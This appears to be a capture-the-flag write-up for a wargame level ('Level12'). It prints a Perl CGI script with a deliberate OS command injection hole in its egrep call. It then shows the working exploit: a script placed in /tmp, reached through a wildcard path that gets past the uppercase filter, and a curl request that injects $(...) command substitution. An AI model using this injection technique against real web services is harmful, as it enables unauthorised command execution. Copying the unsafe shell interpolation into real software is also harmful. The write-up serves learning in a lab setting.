# Level12

**Exploit:** OS command injection in Perl CGI

The CGI parameter reaches a shell command; command substitution runs a script that saves the `getflag` output.

## Walkthrough

We have a level12.pl perl script. We cat it and get this :

```
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Check if server is going fine by
```
curl -i http://localhost:4646/
```

We have a egrep reference location /tmp/xd
We don't have access to /tmp/xd

But egrep match doesnt matter in this attack, as the shell execute $(..) commands before egrep

if /tmp/EXPLOIT exists, /*/EXPLOIT can find it by wildcard * without needing to use lowercase alphabet directly(as perl script is making lowercases to A-Z)

so we make this file, with what we want to execute finally first(echo, chmod +x so to be executable)
so to use it by curl with the wildcard that detours the lowercase detection

curl part details :

Perl code shows by comment that 4646 port webserver is using this Perl script as a CGI program
so curl sends HTTP request and its ther server who uses Perl script
User with curl and the CGI script user's authorisation can be different, so this is the point of the level12

egrep "^$(/*/EXPLOIT)" /tmp/xd 2>&1
would be interpreted as

1. Perl makes it uppercase, no change
2. Shell change it to a command
3. egrep (2. command execution doesnt depend on this egrep command)


## Let's solve 

Create an executable script that writes the flag to a temporary file, then invoke it through the vulnerable parameter:

```bash
echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
chmod +x /tmp/EXPLOIT
curl 'localhost:4646?x=$(/*/EXPLOIT)'
cat /tmp/flag12
```

The script output is saved in `/tmp/flag12`.

